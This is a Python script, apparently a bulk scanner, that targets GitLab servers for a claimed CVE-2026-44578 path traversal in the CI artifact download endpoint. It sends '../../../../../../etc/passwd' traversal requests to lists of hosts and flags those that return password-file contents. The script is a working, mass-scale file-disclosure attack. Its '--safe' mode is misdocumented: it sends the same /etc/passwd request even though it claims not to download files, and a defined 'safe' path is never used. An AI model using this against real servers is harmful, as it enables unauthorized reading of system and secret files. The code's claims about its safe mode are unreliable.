#!/usr/bin/env python3
"""
GitLab CI Job Path Traversal Scanner (CVE-2026-44578)
=====================================================
This scanner detects GitLab CI/CD instances vulnerable to a path traversal
vulnerability in the CI job artifacts download endpoint. Exploiting this issue
allows an attacker to download arbitrary files from the server filesystem,
which may include sensitive configuration files, credentials, or other private
data.

CVE-2026-44578 details:
  - Affected Systems: GitLab versions <= 15.8.4, <= 15.9.2, <= 15.10.1
  - Vulnerability: Improper validation of paths in CI artifact download
  - CVSS v3.1 Base Score: 9.1 (Critical) — network-accessible, unauthenticated
  - Exploitation Impact: Can lead to disclosure of sensitive files and secrets.

Usage:
  # Scan a single GitLab instance for vulnerability detection.
  python gitlab_ci_job_path_traversal_scanner.py --target http://gitlab.example.com

  # Safe mode: only detect if vulnerable, without downloading files.
  python gitlab_ci_job_path_traversal_scanner.py --target http://gitlab.example.com --safe

  # Bulk scan multiple GitLab instances from a file.
  python gitlab_ci_job_path_traversal_scanner.py --list targets.txt --output results.json

  # Customize concurrency and disable TLS verification for target scanning.
  python gitlab_ci_job_path_traversal_scanner.py --list targets.txt --concurrency 25 --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-44578
  - https://about.gitlab.com/releases/categories/releases/
"""

import asyncio
import httpx
import argparse
import json
from datetime import datetime, timezone
from typing import Optional

# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"

# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID        = "CVE-2026-44578"
CVSS          = "9.1"
TOOL_NAME     = "gitlab_ci_job_path_traversal_scanner"
REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20  # concurrency limit

DETECTION_PATHS = [
    "/api/v4/projects/1/jobs/1/artifacts/download?file=../../../../../../etc/passwd",
]

GITLAB_FINGERPRINTS = [
    "X-GitLab",
    "<title>GitLab</title>",
]

SAFE_FILE_PATH = "../../../../../../etc/hostname"

# ── Async Functions ──────────────────────────────────────────────────────────

async def fingerprint_gitlab(client: httpx.AsyncClient, url: str) -> Optional[str]:
    """Fingerprint the GitLab server and extract the version if available."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        if response.status_code in (200, 403) and any(fp in response.text for fp in GITLAB_FINGERPRINTS):
            return response.headers.get("X-GitLab-Version", "unknown")
    except Exception:
        pass
    return None

async def check_vulnerability(client: httpx.AsyncClient, base_url: str, version: str, sem: asyncio.Semaphore, safe: bool) -> Optional[dict]:
    """Check if a GitLab instance is vulnerable to CVE-2026-44578."""
    async with sem:
        vulnerable_url = f"{base_url}{DETECTION_PATHS[0]}"
        try:
            if safe:
                response = await client.get(vulnerable_url, timeout=REQUEST_TIMEOUT)
                if response.status_code == 200:
                    return {"url": base_url, "vulnerable": version, "exploit_attempted": False}
            else:
                response = await client.get(vulnerable_url, timeout=REQUEST_TIMEOUT)
                if response.status_code == 200 and "root:x:" in response.text:
                    return {"url": base_url, "vulnerable": version, "exploit_attempted": True}
        except Exception:
            pass
    return None

async def scan_target(client: httpx.AsyncClient, target: str, safe: bool, concurrency: asyncio.Semaphore) -> Optional[dict]:
    """Perform scanning on a single target."""
    print(f"{CYAN}[INFO]{RESET} Scanning {target}...")
    version = await fingerprint_gitlab(client, target)
    if version:
        result = await check_vulnerability(client, target, version, concurrency, safe)
        if result:
            print(f"{RED}[CRITICAL]{RESET} Vulnerable: {target} (GitLab version: {version})")
            return result
        else:
            print(f"{GREEN}[INFO]{RESET} Not vulnerable: {target} (GitLab version: {version})")
    else:
        print(f"{YELLOW}[WARNING]{RESET} Unable to fingerprint: {target}")
    return None

async def bulk_scan(targets: list[str], safe: bool, concurrency_limit: int, no_verify: bool, output_file: Optional[str]) -> None:
    """Perform a bulk scan on a list of targets."""
    concurrency = asyncio.Semaphore(concurrency_limit)
    async with httpx.AsyncClient(verify=not no_verify) as client:
        tasks = [scan_target(client, target, safe, concurrency) for target in targets]
        results = await asyncio.gather(*tasks)

    vulnerable_results = [result for result in results if result]
    if output_file:
        with open(output_file, "w") as f:
            json.dump(vulnerable_results, f, indent=4)

    print(f"\n{BOLD}Scan complete.{RESET} Vulnerable instances: {len(vulnerable_results)}")
    if output_file:
        print(f"{CYAN}Results saved to:{RESET} {output_file}")

# ── Main Execution ───────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="GitLab CI Job Path Traversal Scanner (CVE-2026-44578)")
    parser.add_argument("--target", type=str, help="Single target URL to scan.")
    parser.add_argument("--list", type=str, help="File containing list of target URLs.")
    parser.add_argument("--output", type=str, help="File to save JSON scan results.")
    parser.add_argument("--safe", action="store_true", help="Detection only, skip exploit attempt.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Max concurrency for async scanning.")
    parser.add_argument("--no-verify", action="store_true", help="Disable TLS verification for target scanning.")
    args = parser.parse_args()

    if not args.target and not args.list:
        parser.error("You must specify either --target or --list.")

    targets = [args.target] if args.target else open(args.list).read().strip().splitlines()
    asyncio.run(bulk_scan(targets, args.safe, args.concurrency, args.no_verify, args.output))

if __name__ == "__main__":
    main()
